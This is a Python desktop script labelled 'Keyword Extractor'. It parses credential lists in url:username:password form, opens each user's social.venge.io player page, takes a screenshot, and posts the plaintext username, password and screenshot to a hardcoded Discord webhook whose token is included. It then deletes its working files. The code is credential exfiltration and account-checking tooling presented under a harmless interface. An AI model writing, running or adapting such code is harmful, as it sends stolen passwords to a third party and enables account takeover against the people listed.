import re
import requests
import tkinter as tk
from tkinter import messagebox
from tkinterdnd2 import DND_FILES, TkinterDnD
import os
from datetime import datetime
import webbrowser  # To open the URL in the default browser
import time
import pyautogui  # To take screenshots and close the tab
import platform  # To check the operating system

# Hardcoded Discord webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1328280421162684497/pSRs8i9GAq1cimOdhyHO9m_VS41_140SQvOwhvscaG9t9yeIL1T5n5mU-m1wUVnh-tMC'

def extract_lines_with_keyword(input_file, output_file, keyword):
    try:
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as file, open(output_file, 'w', encoding='utf-8') as output:
            for line in file:
                line_cleaned = re.sub(r'[^\x00-\x7F]+', '', line)
                if keyword in line_cleaned:
                    output.write(line_cleaned.strip() + '\n')
        messagebox.showinfo("Success", f"Matching lines have been written to '{output_file}'")
        open_second_ui(output_file, keyword)
    except FileNotFoundError:
        log_error(f"File '{input_file}' not found.")
    except Exception as e:
        log_error(str(e))

def drop(event):
    file_path = event.data.strip('{}')
    input_file_entry.delete(0, tk.END)
    input_file_entry.insert(0, file_path)

def process_file():
    input_file = input_file_entry.get()
    output_file = 'user.txt'  
    keyword = keyword_entry.get()

    if input_file and keyword:
        extract_lines_with_keyword(input_file, output_file, keyword)
    else:
        messagebox.showwarning("Warning", "Please provide a valid file and keyword.")

def extract_username_and_generate_url(input_file, output_file, keyword):
    try:
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as file, \
             open(output_file, 'w', encoding='utf-8') as output, \
             open('bad.txt', 'a', encoding='utf-8') as bad_output:  # Append mode for bad.txt
            for line in file:
                line_cleaned = re.sub(r'[^\x00-\x7F]+', '', line.strip())

                if keyword in line_cleaned:
                    match = re.match(r'^https?://[^\s/]+/:([^:]+):([^/]+)$', line_cleaned)
                    if match:
                        username = match.group(1)
                        password = match.group(2)  # Capture password
                        generated_url = f"https://social.venge.io/?player#{username}"
                        output.write(f"{generated_url}\n")
                        
                        # Open the website in the default browser and start the process
                        open_in_browser_and_wait(generated_url, username, password)

                    else:
                        bad_output.write(f"Malformed line: {line_cleaned.strip()}\n")
    except FileNotFoundError:
        log_error(f"File '{input_file}' not found.")
    except Exception as e:
        log_error(str(e))
    finally:
        # Clean up the temporary files
        delete_files(['bad.txt', 'user.txt'])
        # Close the main Tkinter window after processing
        root.destroy()

def open_in_browser_and_wait(url, username, password):
    """Open the website in the default browser, wait for 3 seconds, and then take a screenshot of a specific region."""
    try:
        # Ensure the screenshots folder exists
        screenshots_folder = 'screenshots'
        if not os.path.exists(screenshots_folder):
            os.makedirs(screenshots_folder)

        # Open the URL in the default browser
        webbrowser.open(url)  # Open in default web browser
        print(f"Opening URL in browser: {url}")

        # Wait for 3 seconds (time for the website to load)
        time.sleep(3)

        # Use PyAutoGUI to take a screenshot of a specific region (0, 0, 500, 500)
        screenshot = pyautogui.screenshot(region=(100, 325, 100, 100))  # Define the region
        screenshot_path = os.path.join(screenshots_folder, f"screenshot_{username}.png")
        screenshot.save(screenshot_path)  # Save the screenshot

        # Close the browser tab using Command + W (for macOS) or Ctrl + W (for Windows/Linux)
        if platform.system() == 'Darwin':  # macOS
            pyautogui.hotkey('command', 'w')
        else:  # Windows/Linux
            pyautogui.hotkey('ctrl', 'w')  # Close the tab (works in most browsers)

        # Send the data to Discord with the screenshot, username, and password
        send_to_discord(username, password, url, screenshot_path)

    except Exception as e:
        print(f"Error opening URL in browser: {e}")
        log_error(f"Error opening URL in browser: {e}")

def send_to_discord(username, password, generated_url, screenshot_path):
    """Send content to Discord via webhook using embeds."""
    # Add a unique section header with a timestamp
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Format the message in a readable way
    content = f"@everyone\n**New Player URL Generated**\n\n"
    content += f"**Username**: {username}\n"
    content += f"**Password**: {password}\n"
    content += f"**Generated URL**: {generated_url}\n"
    content += f"**Timestamp**: {timestamp}\n"

    # Attach the screenshot along with the message
    data = {
        "content": content  # This is the text message part
    }

    files = {
        "file": (screenshot_path, open(screenshot_path, 'rb'), "image/png")
    }

    try:
        # Send the data with the screenshot
        response = requests.post(WEBHOOK_URL, data=data, files=files)
        if response.status_code == 204:
            print(f"Successfully sent to Discord: {username}")
        else:
            print(f"Failed to send to Discord. Status code: {response.status_code}, Response: {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        log_error(f"Discord send error: {e}")

    # Clean up the screenshot after sending
    if os.path.exists(screenshot_path):
        os.remove(screenshot_path)

def log_error(message):
    """Log error messages to bad.txt"""
    with open('bad.txt', 'a', encoding='utf-8') as bad_output:
        bad_output.write(f"Error: {message}\n")

def delete_files(file_list):
    """Delete the specified files after processing."""
    for file_name in file_list:
        if os.path.exists(file_name):
            os.remove(file_name)
            print(f"{file_name} has been deleted.")
        else:
            print(f"{file_name} not found, skipping.")

def open_second_ui(input_file, keyword):
    """Open the second UI for generating URLs."""
    second_window = tk.Toplevel(root)
    second_window.title("Generate URLs")
    second_window.geometry("400x300")

    tk.Label(second_window, text="Extract usernames and generate URLs:").pack(pady=10)

    input_file_label = tk.Label(second_window, text=f"Input File: {input_file}")
    input_file_label.pack(pady=5)

    output_file_entry = tk.Entry(second_window, width=50)
    output_file_entry.insert(0, 'website.txt')  # Always save to 'website.txt'
    output_file_entry.pack(pady=5)

    process_button = tk.Button(second_window, text="Generate URLs", command=lambda: extract_username_and_generate_url(input_file, output_file_entry.get(), keyword))
    process_button.pack(pady=20)

# Create the main window
root = TkinterDnD.Tk()
root.title("Keyword Extractor")
root.geometry("400x300")

tk.Label(root, text="Drag and drop a text file here").pack(pady=10)

input_file_entry = tk.Entry(root, width=50)
input_file_entry.pack(pady=5)

# Bind drag and drop functionality
root.drop_target_register(DND_FILES)
root.dnd_bind('<<Drop>>', drop)

keyword_label = tk.Label(root, text="Enter keyword to search:")
keyword_label.pack(pady=5)

keyword_entry = tk.Entry(root, width=50)
keyword_entry.pack(pady=5)

process_button = tk.Button(root, text="Process File", command=process_file)
process_button.pack(pady=20)

root.mainloop()
